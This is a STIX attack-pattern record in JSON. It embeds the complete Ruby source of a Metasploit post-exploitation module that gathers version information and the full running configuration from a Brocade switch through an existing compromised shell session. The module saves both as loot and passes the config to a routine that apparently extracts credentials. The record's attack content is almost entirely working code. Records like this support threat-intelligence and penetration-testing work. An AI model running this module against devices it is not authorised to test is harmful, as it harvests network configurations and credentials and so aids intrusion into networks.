{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1ca5aafb-2477-4ac6-b809-21418f6d0e76",
    "created": "2024-08-14T16:33:17.989013Z",
    "modified": "2024-08-14T16:33:17.989016Z",
    "name": "Brocade Gather Device General Information",
    "description": " This module collects Brocade device information and configuration. This module has been tested against an icx6430 running 08.0.20T311.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/networking/gather/enum_brocade.rb",
            "external_id": "enum_brocade.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Brocade\n  include Msf::Exploit::Deprecated\n  moved_from 'post/brocade/gather/enum_brocade'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Brocade Gather Device General Information',\n        'Description' => %q{\n          This module collects Brocade device information and configuration.\n          This module has been tested against an icx6430 running 08.0.20T311.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'h00die'],\n        'Platform' => [ 'brocade'],\n        'SessionTypes' => [ 'shell' ]\n      )\n    )\n  end\n\n  def run\n    # Get device prompt\n    prompt = session.shell_command(\"\\n\")\n\n    if prompt.end_with?('(config)#') # config shell\n      vprint_status('In a config cli')\n      session.shell_write(\"skip-page-display\\n\")\n      session.shell_write(\"terminal length 0\\n\")\n    elsif prompt.end_with?('#') # regular cli shell (non-config)\n      vprint_status('In an enabled cli')\n      session.shell_write(\"skip-page-display\\n\")\n      session.shell_write(\"terminal length 0\\n\")\n    elsif prompt.end_with?('>') # cli not enabled\n      vprint_status('In a non-enabled cli')\n    end\n\n    # attempt to disable paging, cli not enabled this will fail anyways\n    session.shell_write(\"skip-page-display\\n\")\n    session.shell_write(\"terminal length 0\\n\")\n\n    # Get version info\n    print_status('Getting version information')\n    version_out = session.shell_command(\"show version\\n\")\n    if /^, Version: (?<ver>.+) | SW: Version (?<ver>.+) /i =~ version_out\n      vprint_status(\"OS: #{ver}\")\n    end\n\n    ver_loc = store_loot('brocade.version',\n                         'text/plain',\n                         session,\n                         version_out.strip,\n                         'version.txt',\n                         'Brocade Version')\n\n    # Print the version of VERBOSE set to true.\n    vprint_good(\"Version information stored in to loot #{ver_loc}\")\n\n    # run additional information gathering\n    enum_configs(prompt)\n  end\n\n  # run commands found in exec mode under privilege 1\n  def enum_configs(prompt)\n    host = session.session_host\n    port = session.session_port\n    exec_commands = [\n      {\n        'cmd' => 'show configuration',\n        'fn' => 'get_config',\n        'desc' => 'Get Device Config on Brocade Device'\n      },\n    ]\n    exec_commands.each do |ec|\n      command = ec['cmd']\n      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/, '')\n      print_status(\"Gathering info from #{command}\")\n      # detect if we're in pagination and get as much data as possible\n      if cmd_out.include?('--More--')\n        cmd_out += session.shell_command(\" \\n\" * 20) # 20 pages *should* be enough\n      end\n      if ec['fn'] == 'get_config'\n        brocade_config_eater(host, port, cmd_out.strip)\n      else\n        cmd_loc = store_loot(\"brocade.#{ec['fn']}\",\n                             'text/plain',\n                             session,\n                             cmd_out.strip,\n                             \"#{ec['fn']}.txt\",\n                             ec['desc'])\n        vprint_good(\"Saving to #{cmd_loc}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'brocade']"
    ]
}